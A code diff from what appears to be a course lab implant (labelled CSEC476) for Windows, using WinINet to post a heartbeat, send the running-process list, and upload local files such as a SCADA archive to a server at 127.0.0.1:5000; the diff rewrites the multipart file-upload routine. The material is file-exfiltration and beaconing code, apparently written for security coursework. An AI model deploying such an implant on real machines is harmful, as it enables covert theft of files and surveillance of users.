@@ -18,140 +18,40 @@ using namespace std;
 #define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
 
 
-
-BOOL DoUploadFile(char* pszFilePath, char* pszFileName)
-{
-	LPCSTR boundary = "-----------------------------1234567890123"; 
-	LPCSTR aboundary = "-----------------------------1234567890123";
-
-	HINTERNET hSession = InternetOpenA("HttpSendRequest", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0); //Synchronous mode
-	if (!hSession)
-	{
-		printf("Failed to open InternetOpen\n");
-		return -1;
-	}
-
-	//Connect to an http service:
-	HINTERNET hConnect = InternetConnectA(hSession, "127.0.0.1", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
-
-	if (!hConnect)
-	{
-		printf("error InternetConnect\n");
-		return -1;
-	}
-
-	//upload files 
-	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, INTERNET_FLAG_KEEP_CONNECTION, 0);
-
-	if (!hRequest)
-	{
-		printf("Failed to open request handle: %lu\n", GetLastError());
-		return FALSE;
-	}
-
-	HANDLE hFile = CreateFileA(pszFilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-
-	if (hFile == INVALID_HANDLE_VALUE)
-	{
-		printf("\nFailed to open local file %s.", pszFilePath);
-		return FALSE;
-	}
-	DWORD dwFileSize = GetFileSize(hFile, 0);
-
-	char content_type[128] = { 0 };
-	sprintf_s(content_type, "Content-Type: multipart/form-data; boundary=%s", boundary);
+BOOL doFileUpload(HANDLE hInternet, char* filepath) {
+	//https://stackoverflow.com/questions/6407755/how-to-send-a-zip-file-using-wininet-in-my-vc-application
+	char hdrs[] = "Content-Type: multipart/form-data; boundary=CSEC476";
+	char head[] = "--CSEC476\r\nContent-Disposition: form-data; name=\"userfile\"; filename=\"test.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n";
+	char tail[] = "\r\n--CSEC476--\r\n";
+	char data[2048] = {};
+	DWORD bytesWritten = 0;
+	DWORD bytesRead = 0;
+	HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	DWORD dataSize = GetFileSize(hFile, NULL);
 
 
-	//LPCSTR referer = "Referer: http://127.0.0.1/CRMFiles";
-	//LPCSTR accept = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
-	//LPCSTR accept_lan = "Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3";
-	//LPCSTR accept_encoding = "Accept-Encoding: gzip, deflate";
-	//LPCSTR user_agent = "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0";
-
-	HttpAddRequestHeadersA(hRequest, content_type, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
-	/*
-	HttpAddRequestHeadersA(hRequest, referer, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
-	HttpAddRequestHeadersA(hRequest, accept, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
-	HttpAddRequestHeadersA(hRequest, accept_lan, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
-	HttpAddRequestHeadersA(hRequest, accept_encoding, -1, HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
-	*/
-
-	char first_boundary[128] = { 0 };
-	char delimiter[128] = { 0 };
-	char end_boundary[128] = { 0 };
-	sprintf_s(first_boundary, "--%s\r\n", aboundary);
-	sprintf_s(delimiter, "\r\n--%s\r\n", aboundary);
-	sprintf_s(end_boundary, "\r\n--%s--\r\n", aboundary);
-
-	char content_dispos[128] = { 0 };
-	if (strlen(pszFileName) > 0) {
-		sprintf_s(content_dispos, "Content-Disposition: form-data; name=\"fileupload\"; filename=\"%s\"\r\n", pszFileName);
-		//_stprintf_s(content_dispos, "Content-Disposition: form-data; name=\"fileupload\"; filename=\"%s\"\r\n", pszFileName);
-	}
-	LPCSTR content_type2 = "Content-Type: application/octet-stream\r\n\r\n";
-	LPCSTR rn = "\r\n";
-
+	HANDLE hConnect = InternetConnectA(hInternet, "127.0.0.1", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
+	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	HttpAddRequestHeadersA(hRequest, hdrs, -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
 	
-	INTERNET_BUFFERSA BufferIn = { 0 };
-	BufferIn.dwStructSize = sizeof(INTERNET_BUFFERS);
-	BufferIn.Next = NULL;
-	BufferIn.lpcszHeader = NULL;
-	BufferIn.dwHeadersLength = 0;
-	BufferIn.dwHeadersTotal = 0;
-	BufferIn.lpvBuffer = NULL;
-	BufferIn.dwBufferLength = 0;
-	BufferIn.dwBufferTotal = dwFileSize + strlen(first_boundary) + strlen(content_dispos) + strlen(content_type2) + strlen(end_boundary); //Content-Length:
-	BufferIn.dwOffsetLow = 0;
-	BufferIn.dwOffsetHigh = 0;
+	INTERNET_BUFFERSA bufferIn;
+	memset(&bufferIn, 0, sizeof(INTERNET_BUFFERSA));
+	bufferIn.dwStructSize = sizeof(INTERNET_BUFFERS);
+	bufferIn.dwBufferTotal = strlen(head) + dataSize + strlen(tail);
 
-	if (!HttpSendRequestExA(hRequest, &BufferIn, NULL, 0, 0))
-	{
-		InternetCloseHandle(hRequest);
-		InternetCloseHandle(hConnect);
-		InternetCloseHandle(hSession);
-		printf("Error on HttpSendRequestEx %lu\n", GetLastError());
-		return FALSE;
-	}
+	HttpSendRequestExA(hRequest, &bufferIn, NULL, HSR_INITIATE, 0);
+	InternetWriteFile(hRequest, (const void*)head, strlen(head), &bytesWritten);
 
+	do {
+		ReadFile(hFile, &data, sizeof(data), &bytesRead, NULL);
+		cout << bytesRead << "\n";
+		InternetWriteFile(hRequest, (const void*)data, bytesRead, &bytesWritten);
+		cout << bytesWritten << "\n";
+	} while (bytesRead == sizeof(data));
 
-	DWORD dwWrittenBytes = 0;
-	InternetWriteFile(hRequest, (byte*)first_boundary, strlen(first_boundary), &dwWrittenBytes); //first boundary
-	InternetWriteFile(hRequest, (byte*)content_dispos, strlen(content_dispos), &dwWrittenBytes);
-	InternetWriteFile(hRequest, (byte*)content_type2, strlen(content_type2), &dwWrittenBytes);
-
-	DWORD sum = 0;
-	DWORD dwBytesRead = 0;
-	DWORD dwBytesWritten = 0;
-	BYTE pBuffer[5120] = { 0 }; // Read the file at 5kb (the size of the stack is 1M, over 1M will prompt overflow)
-	BOOL bRead, bRet;
-
-	do
-	{
-		if (!(bRead = ReadFile(hFile, pBuffer, sizeof(pBuffer), &dwBytesRead, NULL)))
-		{
-			printf("\nReadFile failed on buffer %lu.", GetLastError());
-			break;
-		}
-		if (!(bRet = InternetWriteFile(hRequest, pBuffer, dwBytesRead, &dwBytesWritten)))
-		{
-			printf("\nInternetWriteFile failed %lu", GetLastError());
-			break;
-		}
-		sum += dwBytesWritten;
-	} while (dwBytesRead == sizeof(pBuffer));
-	CloseHandle(hFile);
-
-	InternetWriteFile(hRequest, (byte*)end_boundary, strlen(end_boundary), &dwWrittenBytes);
-	printf("Actual written bytes: %d\nupload %s successed!\n", sum, pszFileName);
-
-	if (!HttpEndRequestA(hRequest, NULL, 0, 0))
-	{
-		printf("Error on HttpEndRequest %lu \n", GetLastError());
-		return FALSE;
-	}
-	InternetCloseHandle(hRequest);
-	InternetCloseHandle(hConnect);
-	InternetCloseHandle(hSession);
+	//InternetWriteFile(hRequest, (const void*)data, dataSize, &bytesWritten); // or a while loop for call InternetWriteFile every 1024 bytes...
+	InternetWriteFile(hRequest, (const void*)tail, strlen(tail), &bytesWritten);
+	HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
 	return TRUE;
 }
 
@@ -344,22 +244,17 @@ int main() {
 	const int PORT = 5000;
 	const int SLEEPTIME = 1001;
 
-	char pth[UNLEN + 1];
-	char fnm[UNLEN + 1];
-	strcpy_s(pth, "C:\\Users\\shell\\Desktop\\funtime\\SecLists\\Passwords\\xato-net-10-million-passwords.txt");
-	strcpy_s(fnm, "xato-net-10-million-passwords.txt");
-	/*BOOL bOkey = DoUploadFile(pth, fnm);
-	if (!bOkey)
-	{
-		printf("error DoUploadFile\n");
-	}
-	*/
-
 
 	PCTSTR rgpszAcceptTypes[] = { _T("text/*"), NULL };
 	HANDLE hInternet = InternetOpenA("test1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
 	HANDLE hConnect = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+
+	//const char* pth = "C:\\Users\\shell\\Documents\\McLellan_Jake_462Lab3.docx";
+	const char* pth = "C:\\Users\\shell\\Downloads\\scada_5.8.2_full_en.zip";
+	doFileUpload(hInternet, (char*)pth);
+	system("pause");
+
 
 	//Sends Process List to Server
 	std::string procInfo = getProcToStr();
